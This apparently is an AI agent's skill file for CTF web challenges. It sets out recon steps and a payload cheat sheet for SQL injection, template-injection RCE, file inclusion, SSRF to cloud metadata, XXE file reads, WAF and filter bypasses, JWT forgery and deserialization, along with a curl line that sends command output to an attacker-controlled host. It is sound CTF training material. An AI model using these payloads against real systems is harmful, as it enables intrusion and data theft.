---
name: ctf-web
description: Use for web exploitation challenges in a CTF — SQL injection, XSS, SSTI, XXE, SSRF, LFI/path traversal, IDOR, JWT tampering, deserialization, prototype pollution, command injection, and file upload. Includes the recon order and the bypass table when a filter blocks a payload.
---

# Web

## Recon order

1. **Read the source**, if given. It is the whole challenge. `grep -rn` for the
   sink (`exec`, `eval`, `query`, `render`, `open`, `pickle`).
2. **Look for the challenge's own documentation before you attack anything.**
   CTF web targets frequently *publish their own API reference* — a `/dashboard`,
   `/docs`, `/api`, `README`, or an OpenAPI/Swagger spec — listing every stage,
   endpoint, and required header. One real target served its entire six-stage
   kill chain, including the final assembler and its exact request shape, at
   `/dashboard`. Five minutes here beats an hour of guessing route names, and it
   is the difference between a challenge that looks like a dead end and one that
   is fully mapped. Check it first.
3. **Map the app**: routes, parameters, cookies, headers, and any API the JS calls.
4. **Fingerprint**: `whatweb`, `curl -I`, error pages, `Server`/`X-Powered-By`.
5. **Then** test one class at a time, with a hypothesis each.

```bash
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
```

## By class

**SQLi**
```
' OR 1=1-- -
' UNION SELECT 1,2,3-- -
' AND SLEEP(5)-- -              # blind, time-based
```
`sqlmap -u 'http://t/?id=1' --batch --dump` once injection is confirmed.
SQLite/MySQL/Postgres differ in comment syntax and function names — get the
error message first and let it tell you the engine.

**SSTI** — probe with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
- Jinja2: `{{ ''.__class__.__mro__[1].__subclasses__() }}` → find
  `subprocess.Popen`. `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
- Twig / Freemarker / Velocity: different payloads; fingerprint before exploiting.

**LFI / traversal**
```
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?file=/proc/self/environ
```
PHP wrappers → RCE via log poisoning (`/var/log/apache2/access.log`), `php://input`,
or `data://`.

**SSRF** — `?url=`. Try `http://127.0.0.1:PORT`, `http://169.254.169.254/`
(cloud metadata), `gopher://`. Filter bypasses: decimal/octal IP, `127.1`,
DNS rebinding, `http://[::1]`, redirect chains you control.

*Establish the response mode first.* Many "fetch this URL" endpoints return the
**body verbatim** — that is a full-read SSRF and it is a much bigger primitive
than a blind one. Check before assuming blind. Conversely, the HTTP client
decides which schemes even work: `requests` supports only http/https and answers
`No connection adapters were found for 'file:...'` — the error names the library,
which tells you what to stop trying.

*Enumerate the filter, don't guess it.* Localhost blocks are usually a naive
string match on `127.0.0.1` / `localhost` / `0.0.0.0`. Walk the encodings:

```
127.0.0.1        blocked (baseline)
127.1            often bypasses — and reaches the loopback service
2130706433       decimal      0x7f000001   hex
[::1]  [0:0:0:0:0:0:0:1]       0177.0.0.1   octal
127.0.0.1.nip.io   localtest.me   (DNS that resolves to loopback)
```

Then **port-scan the loopback through the SSRF** — the externally-facing port is
rarely the internal one, and a 502 "connection failed" versus a 200 tells you
which ports are live. Requests made this way appear to come *from the server
itself*, so any route that trusts localhost (IP allowlists, "internal only"
admin paths) is now reachable; that is usually where the flag or the missing key
lives.

**XXE** — any XML parser is a candidate: `Content-Type: application/xml`, SOAP,
SAML, RSS/Atom import, SVG or DOCX/XLSX upload, "import configuration" features.

*First: will this parser resolve external entities at all?* This decides the
whole challenge, and the answer is **version-dependent** (verified against lxml):

| parser | default | consequence |
|---|---|---|
| lxml ≥ 5 | external entities **not** resolved | XXE fails until the app opts in |
| lxml 4.x | `resolve_entities=True` | XXE works out of the box |
| `XMLParser(resolve_entities=True)` | enabled | XXE works on any version |

So **check the target's parser and version before spending time on payloads** —
`requirements.txt`, a lockfile, a stack trace, or `X-Powered-By`. One real target
shipped `lxml==4.9.4` and resolved entities; the same payload against lxml 6
returns `Entity 'x' not defined` and looks like a broken challenge.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

*Know the primitive's limit.* The expanded entity is re-parsed as XML, and the
outcome depends on **which kind of `<`** the file contains — measured against
lxml:

| file content | result | what you get |
|---|---|---|
| no `<` (passwd, hostname, requirements.txt, config) | clean read | the whole file |
| well-formed markup (`<tag>…</tag>`) | **truncated** | everything **before** the first tag |
| bare `<` — a comparison like `if a < b:` | **hard error** | nothing |

The middle row is worth remembering: **HTML, XML and template files are
partially readable**, so you recover everything above the first tag for free.
The third row is the killer — source code is full of comparisons, so a Python or
C file typically fails outright, and the error names the exact line:

```
{"detail":"StartTag: invalid element name, line 154, column 39 (app.py, line 154)"}
```

That proves the file exists *and* that it was read; you simply cannot see past
the first `<`. Do not conclude "XXE is broken" — conclude "this file needs a
different channel", and go look for one (a stack trace in debug mode, a `.map`
or backup file, a static copy, or a second sink that does not re-parse). NUL
bytes fail outright for the same reason.

*When a WAF blocks the scheme.* Filtering is frequently a literal string match
on `file://`, applied to your request body only. Moving the payload out of the
body defeats it:

| Blocked | Bypass that works |
|---|---|
| `file:///etc/passwd` → 403 `{"blocked":"FILE://"}` | `file:/etc/passwd` — **single slash**, still resolves |
| same | `file:%2f%2f%2fetc/passwd` — URL-encoded (version-dependent, see below) |
| case tricks (`FILE://`) | usually normalized — do not rely on them |
| `expect://`, `php://`, `gopher://` | blocked by name too; encode or find another route |

Verified against lxml: with entities enabled, `file:/etc/hostname` resolves
exactly like `file:///etc/hostname`. The single slash is **valid URI syntax**,
not a parser quirk — so this is purely a filter bypass, and it is the one form
that worked on every parser tested. **Prefer it.**

The URL-encoded form is **not** universal: `file:%2f%2f%2fetc/passwd` read files
on lxml 4.9.4 but returned empty on lxml 6.1.3, which does not URL-decode the
entity URI. Keep it as a second attempt, and encode only the leading `///` — the
path itself stays literal. Encoding the whole path (`file:%2ftmp%2fx`) resolves
to nothing on any version.

*Test the advanced channels rather than assuming them — and know the defaults.*
Each was measured against lxml 6, so you know what "off" looks like in one
request instead of an hour:

- **XInclude** — the ideal primitive, because `parse="text"` inlines a file
  *without* parsing it and so reads source code: `<xi:include
  href="file:/app/app.py" parse="text"/>` with
  `xmlns:xi="http://www.w3.org/2001/XInclude"`. **Off by default** in lxml — it
  requires an explicit `tree.xinclude()` call. If the response echoes your
  `<xi:include>` element literally, the app never calls it.
- **External DTD** — measured: lxml does **not** fetch a network DTD even with
  `load_dtd=True` and `no_network=False`; a local listener records no hit and
  the entity stays undefined. Treat OOB-DTD exfiltration as unavailable on lxml
  targets unless the app installs a custom resolver.
- **OOB exfiltration** — needs egress *from the parser's code path*, which may
  be blocked even when the application itself has working outbound HTTP
  (confirmed on a live target: the app's own SSRF reached the internet while its
  XML parser could not). Never assume the app's network access transfers to the
  parser.

**Command injection** — `; id`, `| id`, `` `id` ``, `$(id)`, `%0aid`.
Blind: `; sleep 5`, or exfiltrate via `curl`/DNS to a host you control.

**JWT** — decode the header. `alg:none`; RS256→HS256 confusion (sign with the
public key as the HMAC secret); weak HMAC secret (`hashcat -m 16500`); `kid`
path traversal or SQLi; `jku`/`x5u` pointing at your JWKS.

**Deserialization** — Java (`rO0AB`, `ysoserial`), PHP (`O:8:`, `phpggc`),
Python (`pickle` → `__reduce__` → `os.system`), .NET (`BinaryFormatter`).

**Prototype pollution** — `__proto__` / `constructor.prototype` in a JSON merge.
Client-side: reach a gadget sink. Server-side (Node): chain to RCE.

**File upload** — extension bypass (`.phtml`, `.php5`, `.php.jpg`, trailing dot,
null byte), content-type spoof, magic-byte prefix, `.htaccess` drop, SVG → XSS.

## When a filter blocks you

| Blocked | Try |
|---|---|
| keyword | case (`SeLeCt`), comments (`SEL/**/ECT`), URL-encode, double-encode |
| spaces | `/**/`, `+`, `%09`, `%0a` |
| quotes | hex, `CHAR()`, `0x...` |
| `..` | `....//`, `%2e%2e%2f`, `..%252f` |
| path prefix | absolute path, symlink, trailing `/` |

## Out-of-band confirmation

If you cannot see the result, make the target call **you**: `curl http://<your-host>/$(whoami)`
or a DNS lookup. Use Burp Collaborator or a `nc -lvnp 80`. "Blind" is a
detail, not a dead end.

## Discipline

One hypothesis per request, and read the response before sending the next.
Automated spray before understanding the sink wastes the most time in CTFs.

**A hang is not evidence.** A route that returns 504/500 once, where its
neighbours 404 instantly, looks like a hidden endpoint — but fragile targets
time out at random, and a busy single-threaded backend produces the same 504 for
existent and non-existent paths alike. Re-probe before building a theory on it:
vary the path slightly (`/admin/key` vs `/admin/key/` vs `/admin/key?x=1`). If
the variants 404 while the bare path hung, the hang was congestion. This mistake
cost real time on a live target — an entire "the endpoint blocks on entity
resolution" theory was built on one transient 504.

**A block is not always a block.** When every request to a path returns 401, ask
whether the token is actually landing before concluding the route needs higher
privilege. Credentials that rotate (a JWKS that regenerates per request, a
short-lived session) fail intermittently, and an intermittent 401 reads exactly
like an authorization wall. Retry the same request several times before you
redesign your approach.
